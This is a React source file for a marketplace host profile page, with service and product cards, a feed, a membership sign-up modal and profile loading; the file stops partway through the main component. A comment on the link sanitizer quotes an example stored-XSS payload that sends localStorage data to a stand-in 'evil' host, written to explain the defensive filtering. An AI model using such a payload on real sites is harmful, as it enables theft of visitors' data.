import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate, Navigate, Link } from "react-router-dom";
import { isVanitySlug, VANITY_TARGET } from "../config/vanityRedirects";
import { getHostProfile, getHostReviews, getHostProducts, getHostCourses, getMembershipSpace, getHostTestimonials, getVendorBadges, subscribeNewsletter, recordProfileView } from "../services/api";
import { getAuthorActivity } from "../services/communityApi";
import { DEMO_PERSONAS, DEMO_USERNAME, personaView } from "../data/demoPersonas";
import { analytics, EVENTS } from "../services/analytics";
import BrandPreloader from "../components/preloader/BrandPreloader";
import { useHideChrome } from "../context/ChromeContext";
import Footer from "../components/common/Footer";
import { HostCover } from "../components/common/HostAvatar";
import Seo from "../components/common/Seo";
import ErrorPage from "./ErrorPage";
import TransientError from "../components/error/TransientError";
import { isNotFoundError } from "../utils/fetchError";
import { resolveProfileSeo, profileTabSeo, profileGraphJsonLd, SITE_URL } from "../utils/seo";
import { CourseCard, ProfileMembership, ProfileTabHeading } from "../components/profile/ProfileTabs";
import { profileFaqs } from "../utils/profileFaqs";
import FaqAccordion from "../components/FaqAccordion";
import ItemCard from "../components/community/ItemCard";
import { prerendered } from "../services/prerenderData";
import { BadgeCheck, LayoutGrid, Package, Crown, Newspaper, PlayCircle, MessageCircle, Menu, X } from "lucide-react";

// Production base for canonical/OG (Vercel env overrides the apex default).
const SEO_SITE = import.meta.env?.VITE_PUBLIC_SITE_URL || SITE_URL;
import {
  DEFAULT_THEME_COLOR,
  isValidHex,
  applyProfileTheme,
} from "../utils/themeUtils";

// ─── Design tokens — Meeticulous "Loop & Slot" (light) ──────────────────────────
// Repointed from the old monochrome set to brand tokens, so the cards / reviews /
// FAQ that read `C` are rebranded in one place. The host's chosen colour still
// themes buttons + CTAs via --profile-accent (tc); these are the neutral chrome.
const C = {
  bg:        '#FBF5F3', // cream
  card:      '#FFFFFF',
  text:      '#2B0A14', // ink
  secondary: '#6B524F',
  muted:     '#8C716D',
  border:    '#EBDCD9', // line
  btnBg:     '#960D32', // maroon
  btnText:   '#FFFFFF',
};

// Sanitize a vendor-supplied social link before using it as an href.
// social_links are vendor-controlled and rendered on a public page — a value
// like `javascript:fetch('//evil/?c='+localStorage.user)` would be stored XSS
// against any visitor who clicks it. Allow only http(s) links (and mailto: for
// a valid email); anything else collapses to a harmless '#'.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const safeUrl = (value, isEmail = false) => {
  const v = String(value || '').trim();
  if (isEmail) return EMAIL_RE.test(v) ? `mailto:${v}` : '#';
  return /^https?:\/\//i.test(v) ? v : '#';
};

// ─── Star Rating ─────────────────────────────────────────────────────────────
const Stars = ({ avg, count, size = "sm" }) => {
  const sz = size === "lg" ? "w-4 h-4" : "w-3 h-3";
  return (
    <div className="flex items-center gap-0.5">
      {[1, 2, 3, 4, 5].map((s) => (
        <svg key={s} className={`${sz} flex-shrink-0`}
          style={{ color: s <= Math.round(avg) ? '#F6C35A' : C.border }}
          fill="currentColor" viewBox="0 0 20 20">
          <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
        </svg>
      ))}
      {avg > 0 && (
        <span className="text-xs ml-1" style={{ color: C.secondary }}>
          {avg.toFixed(1)}{count > 0 ? ` (${count})` : ''}
        </span>
      )}
    </div>
  );
};

// ─── Social Icon SVGs — outline (linear) set, monochrome ──────────────────────
const SOCIAL_ICONS = {
  instagram: <>
    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
  </>,
  youtube: <>
    <path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" />
    <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" />
  </>,
  linkedin: <>
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
    <rect x="2" y="9" width="4" height="12" />
    <circle cx="4" cy="4" r="2" />
  </>,
  facebook: <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />,
  twitter:  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />,
  whatsapp: <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />,
  website: <>
    <circle cx="12" cy="12" r="10" />
    <line x1="2" y1="12" x2="22" y2="12" />
    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
  </>,
  github: <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />,
  email: <>
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
    <polyline points="22,6 12,13 2,6" />
  </>,
};

// Social circle, brand-neutral outline on the host-accent tint.
const SocialIcon = ({ platform, href }) => {
  const icon = SOCIAL_ICONS[platform];
  if (!icon || !href) return null;
  return (
    <a href={href} target="_blank" rel="noreferrer"
      className="flex items-center justify-center flex-shrink-0 transition-colors hover:opacity-80"
      style={{ width: 32, height: 32, color: C.secondary }}
      title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
      <svg className="w-4 h-4" fill="none" stroke="currentColor"
        strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round"
        viewBox="0 0 24 24">
        {icon}
      </svg>
    </a>
  );
};

// ─── Badge (image award) ──────────────────────────────────────────────────────
const Badge = ({ badge, onSelect }) => {
  const label = badge.label || badge.name || 'Badge';
  return (
    <button
      type="button"
      onClick={() => onSelect?.(badge)}
      aria-label={label}
      className="flex items-center justify-center cursor-pointer select-none overflow-hidden transition-transform hover:scale-110"
      style={{
        width: 22, height: 22, borderRadius: 6, background: 'transparent', fontSize: 11,
      }}>
      {badge.image_url
        ? <img src={badge.image_url} alt={label} className="w-full h-full object-contain" />
        : <span className="font-extrabold" style={{ color: C.text }}>{label.charAt(0)?.toUpperCase()}</span>}
    </button>
  );
};

// ─── Service tag derivation ───────────────────────────────────────────────────
const getServiceTag = (service) => {
  if (!service.created_at) return null;
  const days = (Date.now() - new Date(service.created_at).getTime()) / 86400000;
  if (days <= 30) return 'New';
  return null;
};

// Compact price label. "Price on request" hides the fee (host quotes offline).
const cardPriceLabel = (s) => (s.price_on_request ? 'On request' : s.price === 0 ? 'Free' : `₹${s.price}`);

// Price with the ₹ symbol and the number baseline-aligned: 3px gap, number nudged
// up 1px (the rupee glyph sits lower than the digits in the display font).
const Price = ({ label }) => {
  if (typeof label === 'string' && label.startsWith('₹')) {
    return (
      <span className="inline-flex items-baseline" style={{ gap: 3 }}>
        <span>₹</span>
        <span style={{ transform: 'translateY(-1px)' }}>{label.slice(1)}</span>
      </span>
    );
  }
  return <>{label}</>;
};

// ─── Service Card ──────────────────────────────────────────────────────────────
const ServiceCard = ({ service: s, profileSlug }) => {
  const _rawDesc  = s.short_description || s.description || '';
  const desc      = _rawDesc.length > 95 ? `${_rawDesc.slice(0, 94)}…` : _rawDesc;
  const detailUrl = s.slug ? `/${profileSlug}/${s.slug}` : null;
  const bookUrl   = s.slug ? `/${profileSlug}/booking/${s.slug}` : null;
  const tag       = getServiceTag(s);

  return (
    <article className="flex flex-col bg-white rounded-2xl"
      style={{ border: `1px solid ${C.border}`, padding: '18px 18px 16px' }}>

      {/* Type badge + tag */}
      <div className="flex items-center justify-between gap-2 mb-2.5">
        <span className="inline-flex items-center gap-1.5 text-[10px] font-bold uppercase tracking-wide px-2.5 py-1 rounded-full"
          style={{ background: 'var(--profile-accent-light, #FFE4EA)', color: 'var(--profile-accent, #960D32)' }}>
          <svg className="w-3 h-3" fill="none" stroke="currentColor" strokeWidth={2.2} viewBox="0 0 24 24">
            <rect x="3" y="4" width="18" height="18" rx="2" /><path d="M16 2v4M8 2v4M3 10h18" />
          </svg>
          1:1 Session
        </span>
        {tag && (
          <span className="flex-shrink-0 text-[10px] font-bold uppercase tracking-wide px-2 py-0.5 rounded-full"
            style={{ background: '#FDF0D2', color: '#5A3A00' }}>
            {tag}
          </span>
        )}
      </div>

      {detailUrl
        ? <Link to={detailUrl} className="font-display font-bold text-base leading-snug hover:opacity-60 transition-opacity line-clamp-2" style={{ color: C.text }}>{s.title}</Link>
        : <span className="font-display font-bold text-base leading-snug line-clamp-2" style={{ color: C.text }}>{s.title}</span>}

      {desc && <p className="text-sm leading-relaxed line-clamp-2 mt-2" style={{ color: C.secondary }}>{desc}</p>}

      {/* Meta — duration + mode */}
      <div className="flex items-center gap-4 text-xs mt-3 mb-4" style={{ color: C.secondary }}>
        <span className="flex items-center gap-1.5">
          <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: '#AF9C99' }} fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 1 0 0-16 8 8 0 0 0 0 16Zm.75-13a.75.75 0 0 0-1.5 0v5c0 .414.336.75.75.75h4a.75.75 0 0 0 0-1.5h-3.25V5Z" clipRule="evenodd" />
          </svg>
          {s.duration} min
        </span>
        <span className="flex items-center gap-1.5">
          {s.meeting_mode === 'offline' ? (
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: '#AF9C99' }} fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M9.69 18.933c.11.055.275.133.46.133.183 0 .349-.078.46-.133a15.3 15.3 0 0 0 4.2-3.57C16.08 13.24 18 10.5 18 8a8 8 0 1 0-16 0c0 2.5 1.92 5.24 3.19 6.943a15.3 15.3 0 0 0 4.3 3.99ZM10 10.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z" clipRule="evenodd" />
            </svg>
          ) : (
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: '#AF9C99' }} fill="currentColor" viewBox="0 0 20 20">
              <path d="M3.25 4A2.25 2.25 0 0 0 1 6.25v7.5A2.25 2.25 0 0 0 3.25 16h7.5A2.25 2.25 0 0 0 13 13.75v-7.5A2.25 2.25 0 0 0 10.75 4h-7.5ZM19 4.75a.75.75 0 0 0-1.28-.53l-3 3a.75.75 0 0 0-.22.53v4.5c0 .199.079.39.22.53l3 3a.75.75 0 0 0 1.28-.53V4.75Z" />
            </svg>
          )}
          {s.meeting_mode === 'offline' ? 'In-person' : 'Online'}
        </span>
        {s.booking_count > 0 && (
          <span className="flex items-center gap-1.5">
            <svg className="w-3.5 h-3.5 flex-shrink-0" style={{ color: '#AF9C99' }} viewBox="0 0 24 24">
              <rect x="3" y="4" width="18" height="17" rx="3" fill="currentColor" />
              <path d="M8 2v3M16 2v3" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" />
              <path d="m8.3 13.6 2.3 2.3 4.4-4.4" fill="none" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            {`Booked ${s.booking_count}×`}
          </span>
        )}
      </div>

      {/* Footer — price + Book */}
      <div className="flex items-center justify-between mt-auto pt-4" style={{ borderTop: `1px solid ${C.border}` }}>
        <div className="font-display font-extrabold text-xl leading-none" style={{ color: C.text }}><Price label={cardPriceLabel(s)} /></div>
        {bookUrl && (
          <Link to={bookUrl}
            className="text-sm font-semibold flex items-center rounded-full transition-all hover:opacity-90 active:scale-[0.97]"
            style={{ background: 'var(--profile-accent, #960D32)', color: 'var(--profile-accent-text, #ffffff)', height: 40, padding: '0 18px' }}>
            Book Now
          </Link>
        )}
      </div>
    </article>
  );
};

// ─── Digital Product Card ─────────────────────────────────────────────────────
const TYPE_ICONS = { pdf: '📄', template: '🗂️', ebook: '📚', prompt_pack: '✨', resource: '🔗', other: '📦' };

const ProductCard = ({ product: p, profileSlug }) => {
  const isFree    = Number(p.price) === 0;
  const typeLabel = String(p.type || 'other').replace(/_/g, ' ');
  const buys      = p.purchase_count || 0;
  const proof     = buys > 0 ? `${buys} ${isFree ? 'downloaded' : 'bought'}` : null;
  const detailUrl = `/${profileSlug}/product/${p.slug || p.id}`;

  return (
    <div className="flex flex-row sm:flex-col bg-white rounded-2xl overflow-hidden"
      style={{ border: `1px solid ${C.border}` }}>

      <Link to={detailUrl}
        className="relative flex-shrink-0 w-28 self-stretch sm:w-full sm:self-auto aspect-[16/9] overflow-hidden"
        style={{ background: 'linear-gradient(135deg, var(--profile-accent-light, #FFE4EA), var(--profile-accent, #960D32))' }}>
        {p.thumbnail_url
          ? <img src={p.thumbnail_url} alt={p.title} loading="lazy" decoding="async" className="w-full h-full object-cover" />
          : <span className="absolute inset-0 flex items-center justify-center text-4xl opacity-50">{TYPE_ICONS[p.type] || '📦'}</span>}
        <span className="absolute top-2 left-2 text-[10px] font-bold uppercase tracking-wide px-2 py-0.5 rounded-full"
          style={{ background: 'rgba(255,255,255,0.92)', color: 'var(--profile-accent, #960D32)' }}>
          {typeLabel}
        </span>
      </Link>

      <div className="flex flex-col gap-1.5 p-4 flex-1 min-w-0">
        <Link to={detailUrl}
          className="font-display font-bold leading-snug line-clamp-2 hover:opacity-60 transition-opacity"
          style={{ color: C.text, fontSize: 15 }}>
          {p.title}
        </Link>
        {proof && <div className="text-xs" style={{ color: C.muted }}>{proof}</div>}
        {p.description && (
          <p className="hidden sm:block text-sm leading-relaxed line-clamp-2" style={{ color: C.secondary }}>{p.description}</p>
        )}
        <div className="flex items-center justify-between mt-auto pt-3" style={{ borderTop: `1px solid ${C.border}` }}>
          <div className="font-display font-extrabold leading-none" style={{ color: C.text, fontSize: 20 }}><Price label={isFree ? 'Free' : `₹${p.price}`} /></div>
          <Link to={detailUrl}
            className="text-sm font-semibold flex items-center rounded-full transition-all hover:opacity-90 active:scale-[0.97]"
            style={{ background: 'var(--profile-accent, #960D32)', color: 'var(--profile-accent-text, #ffffff)', height: 36, padding: '0 16px' }}>
            {isFree ? 'Get Free' : 'Buy Now'}
          </Link>
        </div>
      </div>
    </div>
  );
};

// Prerender-baked /host/:slug payload, or null when it can't be shown as-is.
function bakedProfile(slug) {
  const d = prerendered(`/host/${slug}`);
  if (!d?.host || d.redirect || d.host.username === DEMO_USERNAME) return null;
  return { host: d.host, services: d.services || [] };
}

// ─── Feed — the host's community activity (posts + replies) ─────────────────────
// Community reads are gated: a 404 = the `community` flag is off for this viewer,
// shown as "coming soon". Read-only preview; each item links to its permalink.
const ProfileFeed = ({ host, profileSlug, tc }) => {
  const hostId = host?.id;
  const [s, setS] = useState({ status: 'loading', posts: [], comments: [] });
  const [visible, setVisible] = useState(5); // posts shown; grows by a batch per "Load more"
  useEffect(() => {
    let alive = true;
    setS((p) => ({ ...p, status: 'loading' }));
    getAuthorActivity(hostId)
      .then((d) => alive && setS({ status: 'ready', posts: d.posts || [], comments: d.comments || [] }))
      .catch((e) => alive && setS({ status: e?.response?.status === 404 ? 'gated' : 'error', posts: [], comments: [] }));
    return () => { alive = false; };
  }, [hostId]);

  // Map an activity post into the shape ItemCard (the real community feed card) wants:
  // its author is this host, and space only passes through when it carries a key.
  const hostAuthor = {
    display_name: host?.name,
    avatar_url: host?.profile_image,
    role: 'host',
    profile_url: profileSlug ? `/${profileSlug}` : undefined,
  };
  const toItem = (p) => ({ ...p, author: p.author || hostAuthor, space: p.space?.key ? p.space : undefined });

  const Shell = ({ children }) => (
    <div>
      <div className="mb-5">
        <div className="font-serif italic text-base" style={{ color: '#E0506F' }}>Creator's</div>
        <h2 className="font-display font-extrabold text-2xl sm:text-3xl tracking-tight" style={{ color: C.text }}>Feed</h2>
      </div>
      {children}
    </div>
  );
  const Empty = ({ title, sub }) => (
    <div className="rounded-2xl py-16 text-center" style={{ background: C.card, border: `1px dashed ${C.border}` }}>
      <p className="font-semibold" style={{ color: C.text }}>{title}</p>
      {sub && <p className="mt-1 text-sm" style={{ color: C.muted }}>{sub}</p>}
    </div>
  );

  if (s.status === 'loading') return <Shell><div className="py-16 text-center" style={{ color: C.muted }}>Loading feed…</div></Shell>;
  if (s.status === 'gated')   return <Shell><Empty title="Feed is coming soon" sub="Posts from this creator will show up here." /></Shell>;
  if (s.status === 'error')   return <Shell><div className="py-16 text-center" style={{ color: C.muted }}>Couldn't load the feed.</div></Shell>;
  if (!s.posts.length) return <Shell><Empty title="No posts yet" /></Shell>;

  // Posts-only (replies dropped — low signal here). getAuthorActivity returns the
  // whole page up front, so "Load more" just reveals the next batch from memory —
  // every click is instant, the next set is already loaded. Once all are shown, the
  // page may be capped (<=20 from the endpoint), so point to the full community.
  const shown = s.posts.slice(0, visible);
  const moreLoaded = s.posts.length > visible;

  return (
    <Shell>
      <div className="space-y-4">
        {shown.map((p) => (
          <ItemCard key={p.id} item={toItem(p)} />
        ))}
      </div>
      <div className="mt-5 text-center">
        {moreLoaded ? (
          <button type="button" onClick={() => setVisible((v) => v + 6)}
            className="inline-flex items-center justify-center rounded-full font-semibold text-sm transition-colors"
            style={{ height: 42, padding: '0 22px', border: `1px solid ${C.border}`, background: C.card, color: C.text }}
            onMouseEnter={(e) => { e.currentTarget.style.background = `${tc}0D`; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = C.card; }}>
            Load more
          </button>
        ) : s.posts.length >= 20 ? (
          <Link to="/community" className="text-sm font-semibold hover:underline" style={{ color: tc }}>See all in the community →</Link>
        ) : null}
      </div>
    </Shell>
  );
};

// ─── Membership early-access — coming soon + email capture (newsletter opt-in,
// tagged so sales can see who wants membership). ────────────────────────────────
const MembershipModal = ({ open, onClose, tc }) => {
  const [email, setEmail] = useState('');
  const [state, setState] = useState('idle'); // idle | sending | done | error
  if (!open) return null;
  const submit = (e) => {
    e.preventDefault();
    if (!EMAIL_RE.test(email.trim())) { setState('error'); return; }
    setState('sending');
    subscribeNewsletter(email.trim(), { interest: 'membership-early-access' })
      .then(() => setState('done'))
      .catch(() => setState('error'));
  };
  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4" style={{ background: 'rgba(43,10,20,0.45)' }}
      onClick={onClose} role="dialog" aria-modal="true" aria-label="Membership early access">
      <div className="w-full max-w-md rounded-3xl p-6 sm:p-7" style={{ background: C.card }} onClick={(e) => e.stopPropagation()}>
        <div className="flex items-start justify-between gap-3">
          <div className="flex items-center gap-2">
            <Crown className="w-5 h-5" style={{ color: tc }} />
            <h3 className="font-display font-extrabold text-xl" style={{ color: C.text }}>Membership</h3>
          </div>
          <button onClick={onClose} aria-label="Close" className="p-1 rounded-full" style={{ color: C.muted }}><X className="w-5 h-5" /></button>
        </div>
        {state === 'done' ? (
          <p className="mt-4 text-sm" style={{ color: C.secondary }}>You're on the list — we'll email you when membership opens.</p>
        ) : (
          <>
            <p className="mt-2 text-sm" style={{ color: C.secondary }}>
              Memberships are coming soon. Add your email to get early access.
            </p>
            <form onSubmit={submit} className="mt-4 flex flex-col sm:flex-row gap-2">
              <input type="email" value={email} onChange={(e) => { setEmail(e.target.value); if (state === 'error') setState('idle'); }}
                placeholder="you@email.com" aria-label="Email" required
                className="flex-1 rounded-full px-4 py-2.5 text-sm outline-none"
                style={{ border: `1px solid ${C.border}`, color: C.text }} />
              <button type="submit" disabled={state === 'sending'}
                className="rounded-full px-5 py-2.5 text-sm font-semibold transition-opacity hover:opacity-90 disabled:opacity-60"
                style={{ background: tc, color: '#fff' }}>
                {state === 'sending' ? 'Adding…' : 'Get early access'}
              </button>
            </form>
            {state === 'error' && <p className="mt-2 text-xs" style={{ color: '#B42318' }}>Enter a valid email and try again.</p>}
          </>
        )}
      </div>
    </div>
  );
};

// Empty state for an offering section the host hasn't filled (or that has no public
// listing yet, like courses). Shows a message + a request form: a visitor leaves an
// email and the host is told there's demand (recorded via the newsletter/interest rail).
const OfferingEmpty = ({ type, hostName, profileSlug, tc, C }) => {
  const NOUN = { service: 'sessions', product: 'products', course: 'courses' };
  const noun = NOUN[type] || 'offerings';
  const [email, setEmail] = useState('');
  const [sent, setSent] = useState(false);
  const [busy, setBusy] = useState(false);
  const send = async (e) => {
    e.preventDefault();
    const v = email.trim();
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(v)) return;
    setBusy(true);
    try { await subscribeNewsletter(v, { interest: `request-${type}`, host: profileSlug }); }
    catch { /* soft — still thank them */ }
    finally { setBusy(false); setSent(true); }
  };
  return (
    <div className="rounded-2xl py-12 px-5 text-center" style={{ background: C.card, border: `1px dashed ${C.border}` }}>
      <span className="mx-auto flex items-center justify-center rounded-full" style={{ width: 48, height: 48, background: `${tc}12`, color: tc }}>
        <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m21 21-4.3-4.3" /></svg>
      </span>
      <p className="font-display font-bold text-base mt-3" style={{ color: C.text }}>No {noun} here yet</p>
      {sent ? (
        <p className="text-sm mt-1.5" style={{ color: C.secondary }}>Request noted — {hostName} will hear there's demand.</p>
      ) : (
        <>
          <p className="text-sm mt-1.5 mx-auto" style={{ color: C.muted, maxWidth: 360 }}>Want {hostName} to offer {noun}? Leave your email and we'll pass the request along.</p>
          <form onSubmit={send} className="flex flex-col sm:flex-row gap-2 mx-auto mt-4" style={{ maxWidth: 420 }}>
            <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@email.com"
              aria-label="Your email" className="flex-1 rounded-full text-sm outline-none"
              style={{ height: 42, padding: '0 16px', border: `1px solid ${C.border}`, background: C.bg, color: C.text }} />
            <button type="submit" disabled={busy} className="rounded-full font-semibold text-sm hover:opacity-90"
              style={{ height: 42, padding: '0 20px', background: tc, color: '#fff' }}>{busy ? 'Sending…' : 'Send request'}</button>
          </form>
        </>
      )}
    </div>
  );
};

// ─── Main ─────────────────────────────────────────────────────────────────────
// `tab` = which profile tab this URL shows: services (/:username, the default and
// unchanged) · products · courses · membership (/:username/<tab>, App.jsx).
const HostProfile = ({ tab = 'services' } = {}) => {
  const { profileSlug } = useParams();
  const navigate = useNavigate();
  // This page owns a host-branded navbar + its own footer, so drop the global
  // marketing chrome. useHideChrome flips the flag in a useLayoutEffect (before
  // paint) and the puppeteer prerender runs it too, so the host navbar is baked
  // into the crawler HTML — no flash, no CLS, no hydration mismatch.
  useHideChrome();
  // Vanity easter-egg slugs (/69, /founder, …) redirect to one public profile.
  const isVanity = isVanitySlug(profileSlug);
  const pageRef         = useRef(null);
  // Build-time copy baked into the prerendered HTML → real profile on the first
  // frame; the fetch effect below refreshes it.
  const seed = isVanity ? null : bakedProfile(profileSlug);
  const [host,        setHost]        = useState(seed?.host ?? null);
  const [services,    setServices]    = useState(seed?.services ?? []);
  const [loading,     setLoading]     = useState(!seed);
  const [error,       setError]       = useState('');
  // Demo persona switch (public /demo account only).
  const [isDemo,      setIsDemo]      = useState(false);
  const [personaKey,  setPersonaKey]  = useState(null);
  const demoBase = useRef(null);
  const [filter,      setFilter]      = useState('all'); // services tab: all | feed
  const [navOpen,     setNavOpen]     = useState(false); // mobile profile-nav drawer
  const [memberOpen,  setMemberOpen]  = useState(false); // membership early-access modal
  const [reviewData,  setReviewData]  = useState(() => (seed && prerendered(`/reviews/${profileSlug}`)) || { reviews: [], count: 0, avg: 0 });
  const [showReviews, setShowReviews] = useState(false);
  const [products,    setProducts]    = useState(() => (seed && prerendered(`/products/host/${profileSlug}`)) || []);
  const [courses,     setCourses]     = useState(() => (seed && prerendered(`/courses/host/${profileSlug}`)) || []);
  // Live membership space payload, or null (none / community_memberships off -> 404).
  const [membership,  setMembership]  = useState(() => (seed && prerendered(`/memberships/space/${profileSlug}`)) || null);
  // True once products/courses/membership have answered, so a tab URL with nothing
  // to show can redirect to the profile instead of flashing an empty tab.
  const [tabsSettled, setTabsSettled] = useState(false);
  const [testimonials, setTestimonials] = useState(() => (seed && prerendered(`/host/${profileSlug}/testimonials`)) || []);
  const [badgeList,   setBadgeList]   = useState(() => (seed && prerendered(`/vendors/${profileSlug}/badges`)?.badges) || []);
  const [badgeInfo,   setBadgeInfo]   = useState(null); // clicked badge → bottom-right info popup
  const [cardExpanded, setCardExpanded] = useState(false); // bio "Show more" toggle
  const [linksOpen,    setLinksOpen]    = useState(false); // "Link in Bio" collapsible

  useEffect(() => {
    if (isVanity) return; // vanity slug → redirected in render; skip the 404 lookup
    let alive = true;
    setError('');
    setTabsSettled(false);
    const baked = bakedProfile(profileSlug);
    if (baked) { setHost(baked.host); setServices(baked.services); setLoading(false); } else setLoading(true);
    // Only a real 404 means the host is gone → the noindex ErrorPage is correct.
    // Any OTHER failure (network/timeout, 5xx, 429/403) is transient: retry with
    // backoff, then fall to the non-noindex 'transient' state so a JS-rendering
    // crawler that hit a blip doesn't noindex this live, prerendered page.
    const load = async (attempt = 0) => {
      try {
        const { data } = await getHostProfile(profileSlug);
        if (!alive) return;
        if (data.redirect && data.username) {
          navigate(`/${data.username}`, { replace: true });
          return;
        }
        if (data.host?.username === DEMO_USERNAME) {
          const base = { host: data.host, services: data.services || [] };
          demoBase.current = base;
          setIsDemo(true);
          const firstKey = DEMO_PERSONAS[0].key;
          const view = personaView(base, firstKey);
          setPersonaKey(firstKey);
          setHost(view.host);
          setServices(view.services);
        } else {
          setHost(data.host);
          setServices(data.services || []);
        }
        analytics.track(EVENTS.PROFILE_VIEWED, { host_id: data.host?.id, slug: profileSlug });
        recordProfileView(profileSlug); // v3.205 server-side view counter (fire-and-forget)
        getHostReviews(profileSlug).then(r => setReviewData(r.data)).catch(() => {});
        Promise.allSettled([
          getHostProducts(profileSlug).then(r => setProducts(r.data || [])),
          getHostCourses(profileSlug).then(r => setCourses(r.data || [])),
          getMembershipSpace(profileSlug).then(r => setMembership(r.data || null), () => setMembership(null)),
        ]).then(() => alive && setTabsSettled(true));
        getHostTestimonials(profileSlug).then(r => setTestimonials(r.data || [])).catch(() => {});
        getVendorBadges(profileSlug).then(r => setBadgeList(r.data?.badges || [])).catch(() => {});
        setLoading(false);
      } catch (err) {
        if (!alive) return;
        if (isNotFoundError(err)) { setError('notfound'); setLoading(false); return; }
        if (attempt < 2) { setTimeout(() => { if (alive) load(attempt + 1); }, 800 * (attempt + 1)); return; }
        if (!baked) setError('transient'); // baked copy stays on a transient failure
        setLoading(false);
      }
    };
    load();
    return () => { alive = false; };
  }, [profileSlug, isVanity]);

  // Inject --profile-accent and --profile-accent-text CSS variables so themed
  // elements pick up the host's chosen colour.
  useEffect(() => {
    if (!host || !pageRef.current) return;
    const color = isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
    applyProfileTheme(pageRef.current, color);
    // Stash the colour so the booking page's loading spinner can paint in it from
    // the first frame (before its own fetch resolves). See ServiceBooking.
    try { sessionStorage.setItem(`bas_theme:${profileSlug}`, color); } catch { /* private mode */ }
  }, [host]);

  // Apply a demo persona: override the header fields + show only that persona's
  // services. key=null restores the base account.
  const applyPersona = (key) => {
    const base = demoBase.current;
    if (!base) return;
    const view = personaView(base, key);
    setPersonaKey(key);
    setHost(view.host);
    setServices(view.services);
  };


  // Derived values are null-safe: the component renders the preloader while host
  // is still loading, so these run before host exists.
  const tc        = host && isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
  const social    = host?.social_links || {};
  const bio       = host?.bio || '';
  const badges    = badgeList;
  const firstName = (host?.name || '').trim().split(/\s+/)[0] || 'the host';

  const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];
  const socialLinks  = SOCIAL_ORDER
    .filter(k => social[k])
    .map(k => ({ key: k, href: safeUrl(social[k], k === 'email') }))
    .filter(({ href }) => href !== '#');
  const websiteUrl = safeUrl(social.website);

  const hasProducts = products.length > 0;
  const hasCourses = courses.length > 0;
  const hasMembership = (membership?.tiers?.length || 0) > 0;
  const tabHasItems = { services: true, products: hasProducts, courses: hasCourses, membership: hasMembership }[tab] ?? true;
